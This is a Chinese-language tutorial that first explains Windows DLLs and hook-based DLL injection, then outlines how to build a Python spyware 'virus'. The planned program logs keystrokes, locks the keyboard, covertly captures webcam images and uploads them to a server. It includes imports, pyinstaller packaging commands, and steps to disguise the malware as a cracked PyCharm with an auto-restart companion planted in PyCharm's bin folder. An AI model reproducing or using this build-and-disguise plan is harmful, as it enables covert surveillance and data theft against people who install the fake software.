# 1、基于Python编程的攻击原理

## 一、什么是dll

​    动态链接库（Dynamic Link Library 或者 Dynamic-link Library，缩写为 DLL），是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式。这些库函数的扩展名是 ”.dll"、".ocx"（包含ActiveX控制的库）或者 ".drv"（旧式的系统驱动程序）。

## 二、为何要有dll

​    由于进程的地址空间是独立的（保护模式），当多个进程共享相同的库时，每个库都在硬盘和进程彼此的内存。存放一份的话，对于早期的计算机来说，而这是一种极大的浪费，于是windows系统推出了dll机制，dll在硬盘上存为一个文件，在内存中使用一个实例（instance）。

> 详细如下：
> 在Windows操作系统中，运行的每一个进程都生活在自己的程序空间中（保护模式），每一个进程都认为自己拥有整个机器的控制权，
> 每个进程都认为自己拥有计算机的整个内存空间，这些假象都是操作系统创造的（操作系统控制CPU使得CPU启用保护模式）。
> 理论上而言，运行在操作系统上的每一个进程之间都是互不干扰的，即每个进程都会拥有独立的地址空间。比如说进程B修改了地址为0x4000000的数据，
> 那么进程C的地址为0x4000000处的数据并未随着B的修改而发生改变，并且进程C可能并不拥有地址为0x4000000的内存(操作系统可能没有为进程C映射这块内存)。
> 因此，如果某进程有一个缺陷覆盖了随机地址处的内存(这可能导致程序运行出现问题)，那么这个缺陷并不会影响到其他进程所使用的内存。

## 三、什么是dll注入：　

​    我们可以利用dll机制来实训进程通信或控制其它进程的应用程序。而所谓的dll注入正是是让进程A强行加载程序B给定的a.dll，并执行程序B给定的a.dll里面的代码，从而达到A进程控制B进程的目的。

> 注意，程序B所给定的a.dll原先并不会被程序A主动加载，但是当程序B通过某种手段让程序A“加载”a.dll后，程序A将会执行a.dll里的代码，此时，a.dll就进入了程序A的地址空间，而a.dll模块的程序逻辑由程序B的开发者设计，因此程序B的开发者可以对程序A为所欲为。

## 四、什么时候需要dll注入

　　应用程序一般会在以下情况使用dll注入技术来完成某些功能：

- 1.为目标进程添加新的“实用”功能；
- 2.需要一些手段来辅助调试被注入dll的进程；
- 3.为目标进程安装钩子程序(API Hook)；

## 五、dll注入的方法

　　一般情况下有如下dll注入方法：　　　　
　　　　1.修改注册表来注入dll；
　　　　2.使用CreateRemoteThread函数对运行中的进程注入dll；
　　　　3.使用SetWindowsHookEx函数对应用程序挂钩(HOOK)迫使程序加载dll；
　　　　4.替换应用程序一定会使用的dll；
　　　　5.把dll作为调试器来注入；
　　　　6.用CreateProcess对子进程注入dll
　　　　7.修改被注入进程的exe的导入地址表。
    ps：
        杀毒软件常用钩子来进行处理

## 六、使用SetWindowsHookEx函数对应用程序挂钩(HOOK)迫使程序加载dll

​    ctypes是Python的外部函数库，从Python2.5开始引入。它提供了C兼容的数据类型，并且允许调用动态链接库/共享库中的函数。它可以将这些库包装起来给Python使用。

    ctypes.windll.user32下主要用到三个函数，分别是SetWindowsHookEx() 、CallNextHookEx()和UnhookWindowsHookEx()

　　消息钩子：Windows操作系统为用户提供了GUI(Graphic User Interface，图形用户界面)，
它以事件驱动方式工作。在操作系统中借助键盘、鼠标、选择菜单、按钮、移动鼠标、改变窗口大小与位置等都是事件。
发生这样的事件时，操作系统会把事先定义好的消息发送给相应的应用程序，应用程序分析收到的信息后会执行相应的动作。
也就是说，在敲击键盘时，消息会从操作系统移动到应用程序。
所谓的消息钩子就是在此期间偷看这些信息。以键盘输入事件为例，消息的流向如下：

- 1.发生键盘输入时，WM_KEYDOWN消息被添加到操作系统的消息队列中；
- 2.操作系统判断这个消息产生于哪个应用程序，并将这个消息从消息队列中取出，添加到相应的应用程序的消息队列中;
- 3.应用程序从自己的消息队列中取出WM_KEYDOWN消息并调用相应的处理程序。
  　　当我们的钩子程序启用后，操作系统在将消息发送给用用程序前会先发送给每一个注册了相应钩子类型的钩子函数。钩子函数可以对这一消息做出想要的处理(修改、拦截等等)。多个消息钩子将按照安装钩子的先后顺序被调用，这些消息钩子在一起组成了"钩链"。消息在钩链之间传递时任一钩子函数拦截了消息，接下来的钩子函数(包括应用程序)将都不再收到该消息。
  　　像这样的消息钩子功能是Windows提供的最基本的功能，MS Visual Studio中提供的SPY++就是利用了这一功能来实现的，SPY++是一个十分强大的消息钩取程序，它能够查看操作系统中来往的所有消息。
  　　消息钩子是使用SetWindowsHookEx来实现的。函数的原型如下：

```python
HHOOK WINAPI SetWindowsHookEx(
  _In_ int       idHook,
  _In_ HOOKPROC  lpfn,
  _In_ HINSTANCE hMod,
  _In_ DWORD     dwThreadId
);
```

　　idHook参数是消息钩子的类型，可以选择的类型在MSDN中可以查看到相应的宏定义。比如我们想对所有的键盘消息做挂钩，其取值将是WH_KEYBOARD，WH_KEYBOARD这个宏的值是2。
　　lpfn参数是钩子函数的起始地址，注意：不同的消息钩子类型的钩子函数原型是不一样的，因为不同类型的消息需要的参数是不同的，具体的钩子函数原型需要查看MSDN来获得。注意：钩子函数可以在结束前任意位置调用CallNextHookEx函数来执行钩链的其他钩子函数。当然，如果不调用这个函数，钩链上的后续钩子函数将不会被执行。
　　hMod参数是钩子函数所在的模块的模块句柄。
　　dwThreadId参数用来指示要对哪一个进程/线程安装消息钩子。如果这个参数为0，安装的消息钩子称为“全局钩子”，此时将对所有的进程(当前的进程以及以后要运行的所有进程)下这个消息钩子。注意：有的类型的钩子只能是全局钩子。
　　注意：钩子函数应当放在一个dll中，并且在你的进程中LoadLibrary这个dll。然后再调用SetWindowsHookEx函数对相应类型的消息安装钩子。
　　当SetWindowsHookEx函数调用成功后，当某个进程生成这一类型的消息时，操作系统会判断这个进程是否被安装了钩子，如果安装了钩子，操作系统会将相关的dll文件强行注入到这个进程中并将该dll的锁计数器递增1。然后再调用安装的钩子函数。整个注入过程非常方便，用户几乎不需要做什么。
　　当用户不需要再进行消息钩取时只需调用UnhookWindowsHookEx即可解除安装的消息钩子，函数的原型如下：


    BOOL WINAPI UnhookWindowsHookEx(
      _In_ HHOOK hhk
    );

　　hhk参数是之前调用SetWindowsHookEx函数返回的HOOK变量/句柄。这个函数调用成功后会使被注入过dll的锁计数器递减1，当锁计数器减到0时系统会卸载被注入的dll。

　　这种类型的dll注入的优点是注入简单，缺点是只能对windows消息进行Hook并注入dll，而且注入dll可能不是立即被注入，因为这需要相应类型的事件发生。其次是它不能进行其他API的Hook，如果想对其它的函数进行Hook，你需要再在被注入的dll中添加用于API Hook的代码。
　　dll注入代码包含两部分，一部分是dll的源文件，另一部分是控制台程序的源代码。
   HMODULE Hmod = LoadLibraryA("hookdll.dll");

## 七：准备工作

### #1、最新anocoda3.7

https://www.anaconda.com/distribution/#download-section

### #2、提速下载可以改变源

pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple

### #3、安装pywin32,安装时指定安装目录，默认为C:\Python37\Lib\site-packages\

https://github.com/mhammond/pywin32/releases

### #4、安装opencv-python

pip install opencv-python

### #5、安装pyinstaller，依赖pyin32

pip install pyinstaller

### #6、ico文件准备好

在线制作
or
https://www.easyicon.net/500133-QQ_Penguin_tencent_icon.html

### #7、了解一下要用到的功能：

```python
from time import sleep,strftime
from os import listdir,remove
from os.path import exists, getsize,abspath,expanduser,basename
from sys import exit
from struct import pack
from json import dumps
from socket import socket, AF_INET, SOCK_STREAM
from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
from win32con import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, FILE_ATTRIBUTE_HIDDEN, WH_KEYBOARD_LL, WM_KEYDOWN
from win32api import GetConsoleTitle, RegOpenKey, RegSetValueEx, RegCloseKey, SetFileAttributes
from win32gui import FindWindow, ShowWindow
from cv2 import VideoCapture, CAP_DSHOW, imwrite, destroyAllWindows

from ctypes import windll  # windll.user32、windll.kernel32
from ctypes import CFUNCTYPE
from ctypes import byref
from ctypes import POINTER
from ctypes import c_int, c_void_p
from ctypes.wintypes import MSG

from threading import Timer
from threading import Thread
from threading import Lock
```

## 编程步骤

1、先编写病毒程序=》WinCoreManagerment.py

​    监听键盘输入->并记录日志
​    锁定键盘功能
​    偷拍功能->保存图片文件

    上传数据功能：套接字客户度

2、编写服务端（socketserver）

​    secureCRT图形界面-》windows
​    系统自带scp命令-》linux
​    python的模块-》paramiko模块
​    纯手写客户端套接字

3、服务端部署，修改安全组，开发端口

5、病毒程序制作二进制

6、病毒程序进行伪装处理，并打包成exe

6.1 编写伪装文件："pycharm破解版.py"

6.2 编写无限重启文件："System.py"

6.3 打包制作二进制exe

```shell
pyinstaller -i system.ico -Fw WinCoreManagement.py
pyinstaller -i system.ico -Fw System.py
pyinstaller -i pycharm.ico -Fw pycharmCrackingProgram.py
```

> 指定-w参数后就不要设置后台运行了

6.4 将三个exe文件放入正常pycharm软件包下的bin目录下

7、关闭Virus进程方法

打开命令输入下面三行命令可以关闭。

```shell
taskkill /F /IM System.exe

taskkill /F /IM WinCoreManagement.exe

taskkill /F /IM pycharm.exe
```

